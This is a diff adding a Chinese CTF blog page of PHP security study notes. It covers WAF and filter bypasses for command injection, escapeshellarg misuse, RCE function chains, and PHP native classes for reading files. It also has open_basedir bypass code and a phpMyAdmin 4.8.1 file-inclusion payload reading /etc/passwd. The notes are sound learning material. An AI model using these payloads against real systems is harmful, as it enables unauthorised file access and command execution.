@@ -1,0 +1,677 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="PHP相关方法/问题">
+  <meta name="author" content="OPN">
+  <meta name="keywords" content="">
+  
+  <title>PHP-way - OPN&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHP-way">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-27 19:16" pubdate>
+        2021年10月27日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP-way</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>PHP相关方法/问题</p>
+<span id="more"></span>
+
+<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/baidu_41871794/article/details/83750615">https://blog.csdn.net/baidu_41871794/article/details/83750615</a></p>
+<h1 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h1><h2 id="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"><a href="#前端过滤–变量名前加空格–PHP解析时先将变量的空格去除" class="headerlink" title="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"></a>前端过滤–变量名前加空格–PHP解析时先将变量的空格去除</h2><p>为什么要在num前加一个空格？</p>
+<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>PHP的字符串解析特性是什么？</p>
+<p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）<br>【当waf不让你过的时候，php却可以让你过】</p>
+<p>—[RoarCTF 2019]Easy Calc](<a href="https://opn90.top/2021/10/21/BUU/#RoarCTF-2019-Easy-Calc">https://opn90.top/2021/10/21/BUU/#RoarCTF-2019-Easy-Calc</a>)</p>
+<h1 id="常见函数绕过"><a href="#常见函数绕过" class="headerlink" title="常见函数绕过"></a>常见函数绕过</h1><h2 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><p>先对单引号进行转义，再进行分段单引号闭合</p>
+<p>escapeshellarg一把字符串转码为可以在shell 命令里使用的参数</p>
+<p><img src="/2021/10/27/PHP-ways/escapeshellarg-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>例：</p>
+<p><img src="/2021/10/27/PHP-ways/escapeshellarg-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
+<p>经过 escapeshellarg 函数处理过的参数被拼凑成 shell 命令，并且被双引号包裹这样就会造成漏洞，这主要在于bash中双引号和单引号解析变量是有区别的</p>
+<p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用</p>
+<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><p>escapeshellcmd——shell 元字符转义</p>
+<p><img src="/2021/10/27/PHP-ways/escapeshellarg-3.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="CVE-2016-10045-escapeshellarg与escapeshellcmd使用不当"><a href="#CVE-2016-10045-escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="CVE-2016-10045 escapeshellarg与escapeshellcmd使用不当"></a>CVE-2016-10045 escapeshellarg与escapeshellcmd使用不当</h3><p><img src="/2021/10/27/PHP-ways/escapeshellarg-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析详细过程：</p>
+<p><img src="/2021/10/27/PHP-ways/escapeshellarg-2.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">标注出处：http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">标注出处：https://paper.seebug.org/164/</a></p>
+<hr>
+<h1 id="命令执行（暂）"><a href="#命令执行（暂）" class="headerlink" title="命令执行（暂）"></a>命令执行（暂）</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 |</h2><p><img src="/2021/10/27/PHP-ways/pingpingping-4.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>多命令执行符<br>; 执行完前面的语句再执行后面的语句<br>| 显示后面语句的执行结果<br>|| 当前面的语句执行出错时，执行后面的语句<br>&amp; 如果前面的语句为假则执行后面的语句，前面的语句可真可假<br>&amp;&amp; 如果前面的语句为假，则直接出错，也不执行后面的语句，前面的语句只能为真  </li>
+</ul>
+<h2 id="查询字符过滤"><a href="#查询字符过滤" class="headerlink" title="查询字符过滤"></a>查询字符过滤</h2><div class="hljs code-wrapper"><pre><code>cat   
+tac  
+more  
+less  
+head  
+tail  
+nl  
+tailf
+sed  
+sort  
+uniq  
+rev  
+</code></pre></div>
+<h2 id="空格-space-过滤"><a href="#空格-space-过滤" class="headerlink" title="空格(space)过滤"></a>空格(space)过滤</h2><div class="hljs code-wrapper"><pre><code>&#123;cat,flag.txt&#125;
+$&#123;IFS&#125;
+$IFS$9
+&lt;
+&lt;&gt;
+%0a (换行)
+%0d（回车）
+%00
+%09
+%20
+</code></pre></div>
+<p>解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离</p>
+<h2 id="系统函数过滤"><a href="#系统函数过滤" class="headerlink" title="系统函数过滤"></a>系统函数过滤</h2><div class="hljs code-wrapper"><pre><code>system()
+exec()
+passthru()
+shell_exec()
+``
+</code></pre></div>
+<p>[GXYCTF2019]Ping Ping Ping](<a href="https://opn90.top/2021/10/21/BUU/#GXYCTF2019-Ping-Ping-Ping">https://opn90.top/2021/10/21/BUU/#GXYCTF2019-Ping-Ping-Ping</a>)</p>
+<h2 id="ls过滤用dir"><a href="#ls过滤用dir" class="headerlink" title="ls过滤用dir"></a>ls过滤用dir</h2><h2 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h2><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><h2 id="特殊字符的使用"><a href="#特殊字符的使用" class="headerlink" title="特殊字符的使用"></a>特殊字符的使用</h2><h5 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h5><p>ca\t 后面的\t会成为 TAB 而绕过</p>
+<h5 id="重定向符-lt-gt"><a href="#重定向符-lt-gt" class="headerlink" title="重定向符 &lt;&gt;"></a>重定向符 &lt;&gt;</h5><p>cat&lt;&gt;flag</p>
+<h5 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h5><p>c””at fl’’ag</p>
+<h5 id="1、-2和"><a href="#1、-2和" class="headerlink" title="$1、$2和$@"></a>$1、$2和$@</h5><p>c$1at gh$@twf01.txt</p>
+<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符???"></a>通配符???</h5><p>/???/?at flag</p>
+<h5 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h5><p>`命令`和$(命令)都是执行命令的方式</p>
+<p>echo “xx<code>pwd</code>“</p>
+<p>echo “xx$(pwd)”</p>
+<h2 id="linux中换行"><a href="#linux中换行" class="headerlink" title="linux中换行"></a>linux中换行</h2><h2 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a>或运算</h2><hr>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h4 id="scandir-读取目录"><a href="#scandir-读取目录" class="headerlink" title="scandir() 读取目录"></a>scandir() 读取目录</h4><h4 id="file-get-contents-highlight-file-show-source-读文件"><a href="#file-get-contents-highlight-file-show-source-读文件" class="headerlink" title="file_get_contents()/highlight_file()/show_source() 读文件"></a>file_get_contents()/highlight_file()/show_source() 读文件</h4><h4 id="localeconv-返回一包含本地数字及货币格式信息的数组"><a href="#localeconv-返回一包含本地数字及货币格式信息的数组" class="headerlink" title="localeconv() 返回一包含本地数字及货币格式信息的数组"></a>localeconv() 返回一包含本地数字及货币格式信息的数组</h4><h4 id="current-pos-函数返回数组中的当前元素-单元-默认取第一个值"><a href="#current-pos-函数返回数组中的当前元素-单元-默认取第一个值" class="headerlink" title="current()/pos() 函数返回数组中的当前元素(单元),默认取第一个值"></a>current()/pos() 函数返回数组中的当前元素(单元),默认取第一个值</h4><h4 id="array-reverse-接受数组array作为输入并返回一个单元为相反顺序的新数组"><a href="#array-reverse-接受数组array作为输入并返回一个单元为相反顺序的新数组" class="headerlink" title="array_reverse() 接受数组array作为输入并返回一个单元为相反顺序的新数组"></a>array_reverse() 接受数组array作为输入并返回一个单元为相反顺序的新数组</h4><h4 id="array-flip-交换数组的键和值"><a href="#array-flip-交换数组的键和值" class="headerlink" title="array_flip() 交换数组的键和值"></a>array_flip() 交换数组的键和值</h4><h4 id="array-rand-从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回"><a href="#array-rand-从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回" class="headerlink" title="array_rand() 从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回"></a>array_rand() 从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回</h4><h4 id="next-指向当前数组的下一个元素"><a href="#next-指向当前数组的下一个元素" class="headerlink" title="next() 指向当前数组的下一个元素"></a>next() 指向当前数组的下一个元素</h4><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h4 id="var-dump-scandir-读取根目录"><a href="#var-dump-scandir-读取根目录" class="headerlink" title="var_dump(scandir(/)) 读取根目录"></a>var_dump(scandir(/)) 读取根目录</h4><h4 id="pos-localeconv-返回一个"><a href="#pos-localeconv-返回一个" class="headerlink" title="pos(localeconv()) 返回一个."></a>pos(localeconv()) 返回一个.</h4><h4 id="show-source-array-reverse-scandir-pos-localeconv-返回当前目录下的最后一个文件"><a href="#show-source-array-reverse-scandir-pos-localeconv-返回当前目录下的最后一个文件" class="headerlink" title="show_source(array_reverse(scandir(pos(localeconv())))) 返回当前目录下的最后一个文件"></a>show_source(array_reverse(scandir(pos(localeconv())))) 返回当前目录下的最后一个文件</h4><h4 id="show-source-array-rand-array-flip-scandir-current-localeconv-随机读取文件"><a href="#show-source-array-rand-array-flip-scandir-current-localeconv-随机读取文件" class="headerlink" title="show_source(array_rand(array_flip(scandir(current(localeconv()))))) 随机读取文件"></a>show_source(array_rand(array_flip(scandir(current(localeconv()))))) 随机读取文件</h4><hr>
+<h1 id="原生类的应用"><a href="#原生类的应用" class="headerlink" title="原生类的应用"></a>原生类的应用</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/115314651">完整博客:https://blog.csdn.net/cjdgg/article/details/115314651</a></p>
+<h2 id="PHP-原生文件操作类"><a href="#PHP-原生文件操作类" class="headerlink" title="PHP 原生文件操作类"></a>PHP 原生文件操作类</h2><h3 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h3><p>可遍历目录类</p>
+<div class="hljs code-wrapper"><pre><code>DirectoryIterator 
+FilesystemIterator 
+GlobIterator 
+</code></pre></div>
+<h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h4><p>提供了一个用于查看文件系统目录内容的简单接口<br>该类的构造方法将会创建一个指定目录的迭代器</p>
+<div class="hljs code-wrapper"><pre><code>创建一个指定目录的迭代器。当执行到echo函数时，
+会触发DirectoryIterator类中的 __toString() 方法，
+输出指定目录里面经过排序之后的第一个文件名
+
+&lt;?php  
+$dir = new DirectoryIterator(&quot;/&quot;);
+echo $dir;
+</code></pre></div>
+<hr>
+<div class="hljs code-wrapper"><pre><code>输出全部的文件名我们还需要对$dir对象进行遍历
+
+&lt;?php 
+$dir= new DirectoryIterator(&quot;/&quot;);
+foreach($dir as $f)
+&#123;
+    echo($f.&#39;&lt;br&gt;&#39;);
+    //echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
+&#125;
+</code></pre></div>
+<h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>一个用于查看文件系统目录内容的简单接口<br>该类的构造方法将会创建一个指定目录的迭代器  </p>
+<div class="hljs code-wrapper"><pre><code>//利用方法同 DirectoryIterator
+
+&lt;?php  
+$dir = new FilesystemIterator(&quot;/&quot;);
+echo $dir;
+
+&lt;?php 
+$dir= new FilesystemIterator(&quot;/&quot;);
+foreach($dir as $f)
+&#123;
+    echo($f.&#39;&lt;br&gt;&#39;);
+    //echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
+&#125;
+</code></pre></div>
+<h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><p>使用方法与前两个类也基本相似<br>但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php  
+$dir = new GlobIterator(&quot;/*flag*&quot;);
+echo $dir;
+</code></pre></div>
+<h4 id="使用可遍历目录类绕过-open-basedir"><a href="#使用可遍历目录类绕过-open-basedir" class="headerlink" title="使用可遍历目录类绕过 open_basedir"></a>使用可遍历目录类绕过 open_basedir</h4><h5 id="使用-DirectoryIterator-类"><a href="#使用-DirectoryIterator-类" class="headerlink" title="使用 DirectoryIterator 类"></a>使用 DirectoryIterator 类</h5><p>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件  </p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php 
+$dir = $_GET[&#39;aaa&#39;];
+$a = new DirectoryIterator($dir);
+foreach($dir as $f)
+&#123;
+    echo $f;
+&#125;
+?&gt;
+
+# payload 一句话形式
+$aaa = new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($a as $f)&#123;echo $f;&#125;
+</code></pre></div>
+<h5 id="使用-GlobIterator-类"><a href="#使用-GlobIterator-类" class="headerlink" title="使用 GlobIterator 类"></a>使用 GlobIterator 类</h5><p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用配合glob://协议了</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php 
+$dir = $_GET[&#39;aaa&#39;];
+$a = new GlobIterator($dir);
+foreach($dir as $f)
+&#123;
+    echo $f;
+&#125;
+?&gt;
+
+# payload 一句话形式
+$aaa = new GlobIterator(&quot;/*&quot;);
+foreach($a as $f)&#123;echo $f;&#125;
+</code></pre></div>
+<h3 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a>可读取文件类</h3><h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h4><p>SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p>
+<p>该类的构造方法可以构造一个新的文件对象用于后续的读取</p>
+<div class="hljs code-wrapper"><pre><code>//读取文件的一行
+
+&lt;?php      
+$content = new SplFileObject(&#39;/flag&#39;);
+echo $content;
+
+//遍历出文件
+
+&lt;?php      
+$content = new SplFileObject(&#39;/flag&#39;);
+foreach($content as $f)
+&#123;
+    echo $f;
+&#125;
+</code></pre></div>
+<hr>
+<h1 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir() 绕过"></a>open_basedir() 绕过</h1><h3 id="1-原生类绕过"><a href="#1-原生类绕过" class="headerlink" title="1.原生类绕过"></a>1.原生类绕过</h3><p>仅可用于读取根目录、当前目录<br>(不清楚为什么…)</p>
+<h5 id="使用-DirectoryIterator-类-glob-协议"><a href="#使用-DirectoryIterator-类-glob-协议" class="headerlink" title="使用 DirectoryIterator 类  + glob://协议"></a>使用 DirectoryIterator 类  + glob://协议</h5><h5 id="使用-GlobIterator-类-glob-协议"><a href="#使用-GlobIterator-类-glob-协议" class="headerlink" title="使用 GlobIterator 类  +  glob://协议"></a>使用 GlobIterator 类  +  glob://协议</h5><h3 id="2-ini-set-相对路径"><a href="#2-ini-set-相对路径" class="headerlink" title="2.ini_set() + 相对路径"></a>2.ini_set() + 相对路径</h3><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复</p>
+<p><img src="/2021/10/27/PHP-ways/open-2.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="1-首先需要构造一个相对可上跳的open-basedir"><a href="#1-首先需要构造一个相对可上跳的open-basedir" class="headerlink" title="(1)首先需要构造一个相对可上跳的open_basedir"></a>(1)首先需要构造一个相对可上跳的open_basedir</h5><p>(创建目录时需注意权限问题)</p>
+<div class="hljs code-wrapper"><pre><code>mkdir(&#39;opn&#39;);
+chdir(&#39;opn&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
+</code></pre></div>
+<p>这也是为什么要先创文件夹的原因，就是为了在当前目录构造可以..的ini_set</p>
+<h5 id="2-然后每次目录操作"><a href="#2-然后每次目录操作" class="headerlink" title="(2)然后每次目录操作"></a>(2)然后每次目录操作</h5><div class="hljs code-wrapper"><pre><code>chdir(&#39;..&#39;);
+</code></pre></div>
+<h5 id="3-设置根目录下的open-basedir"><a href="#3-设置根目录下的open-basedir" class="headerlink" title="(3)设置根目录下的open_basedir"></a>(3)设置根目录下的open_basedir</h5><div class="hljs code-wrapper"><pre><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
+</code></pre></div>
+<h5 id><a href="#" class="headerlink" title></a></h5><div class="hljs code-wrapper"><pre><code>mkdir(&#39;opn&#39;);
+chdir(&#39;opn&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
+chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">从PHP底层看open_basedir bypass – sky</a></p>
+<h3 id="3-shell命令执行"><a href="#3-shell命令执行" class="headerlink" title="3.shell命令执行"></a>3.shell命令执行</h3><h3 id="4-symlink-软连接"><a href="#4-symlink-软连接" class="headerlink" title="4.symlink()软连接"></a>4.symlink()软连接</h3><hr>
+<h1 id="PHP版本漏洞"><a href="#PHP版本漏洞" class="headerlink" title="PHP版本漏洞"></a>PHP版本漏洞</h1><h2 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h2><p><a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/e7c68814.html">https://www.xiinnn.com/article/e7c68814.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.abelche.com/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/">https://www.abelche.com/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43872099/article/details/104128639">https://blog.csdn.net/weixin_43872099/article/details/104128639</a></p>
+<p><img src="/2021/10/27/PHP-ways/CVE-2018-12613-1.png" srcset="/img/loading.gif" lazyload></p>
+<div class="hljs code-wrapper"><pre><code>index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+</code></pre></div>
+<hr>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web-PHP/">web PHP</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/10/29/file-upload/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件上传漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/21/BUU/">
+                        <span class="hidden-mobile">BUU</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
